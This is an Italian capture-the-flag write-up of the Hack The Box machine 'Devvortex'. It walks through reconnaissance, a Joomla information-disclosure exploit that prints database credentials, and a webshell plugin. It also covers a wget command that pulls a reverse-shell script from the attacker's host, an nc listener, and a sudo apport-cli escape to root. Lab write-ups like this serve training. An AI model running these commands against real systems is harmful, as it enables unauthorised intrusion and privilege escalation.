# Devvortex

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.11.242
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.11.242
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/3%OT=22%CT=1%CU=38696%PV=Y%DS=2%DC=I%G=Y%TM=65953
OS:010%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=107%TI=Z
OS:%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54
OS:DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%
OS:W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=
OS:Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Aggiungo _devvortex.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration

Successivamente, visito la pagina http://devvortex.htb/:

<p align="center">
  <img src="/Immagini/Linux-Box/Devvortex/devvortex-1.png"/>
</p>

Provo ad utilizzare il comando _ffuf_ per eseguire una Directory Fuzzing:

```text
ffuf -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'http://devvortex.htb/FUZZ'
```

Ma il risultato ottenuto non è interessante.

Provo quindi con la ricerca di qualche sottodominio:

```text
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.devvortex.htb/
```

Trovo così il sottodominio _dev.devvortex.htb_ e lo aggiungo al file _/etc/hosts_.

Utilizzo di nuovo il comando _ffuf_:

```text
ffuf -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'http://dev.devvortex.htb/FUZZ'
```

In questo modo scopro la pagina _http://dev.devvortex.htb/robots.htb/_, la quale contiene il seguente testo:

```text
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Utilizzo il tool _joomscan_ per riconoscere la versione di _joomla_ utilizzata dalla web application:

<p align="center">
  <img src="/Immagini/Linux-Box/Devvortex/devvortex-2.png"/>
</p>

Tramite una rapida ricerca scopro [questa](https://github.com/Acceis/exploit-CVE-2023-23752) vulnerabilità e passo alla fase successiva.

## Exploitation

Eseguo l'exploit è ottengo il seguente risultato:

```text
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

Vado sulla pagina _http://dev.devvortex.htb/administrator/_ e accedo con le credenziali appena trovate.

Dopo varie ricerche mi imbatto in questo repository: _https://github.com/p0dalirius/Joomla-webshell-plugin_.

Seguo le istruzioni ed installo il plugin.

Ottegno un accesso davvero limitato alla shell. Per questo motivo eseguo i seguenti passaggi per ottenerne una migliore:

  - Scarico da _https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet_ il file per creare una remote-shell e lo modifico.
  - Metto in piedi un web server tramite python:
    - "python -m http.server 8090"
  - Scarico il file sulla macchina vittima:
   - "http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=wget -O /var/www/dev.devvortex.htb/s.php http://10.10.14.7:8090/shell.php"
  - Avvio un listener sulla porta 4444:
    - "nc -lvnp 4444"
  - Faccio partire la shell:
    - http://dev.devvortex.htb/s.php

**Ottengo una shell!**

<p align="center">
  <img src="/Immagini/Linux-Box/Devvortex/devvortex-3.png"/>
</p>

Provo quindi al database _mysql_ con le credenziali ottenute in precedenza:

```text
mysql -h localhost -u lewis -p
```

Così facendo ottengo l'hash della password e procedo utilizzando _johntheripper_:

<p align="center">
  <img src="/Immagini/Linux-Box/Devvortex/devvortex-4.png"/>
</p>

Accedo tramite ssh utilizzando la password appena ottenuta.

**Ottengo cosi il primo flag!**

## Privilege Escalation

Per prima cosa eseguo il seguente comando:

```text
sudo -l
```

<p align="center">
  <img src="/Immagini/Linux-Box/Devvortex/devvortex-5.png"/>
</p>

Da questo risultato sembra essere impiegata l'utility apport-cli. Eseguiamolo e vediamo cosa incontriamo. Dopo alcune ricerche scopro che è presente una vulnerabilità che mi permette di scalare i privilegi.

Eseguo il seguente comando:

```text
sudo apport-cli -c /var/crash/xxx.crash less
```

Premo la lettera V e attendo per qualce secondo. Eseguo quindi il comando _!/bin/bash/.

**Ottengo cosi il flag root!**

## Credits

  - [$$$->K0bR4<-$$$](https://medium.com/@marcovit87/hack-the-box-seasonal-devvortex-walkthrough-f6d268786805)
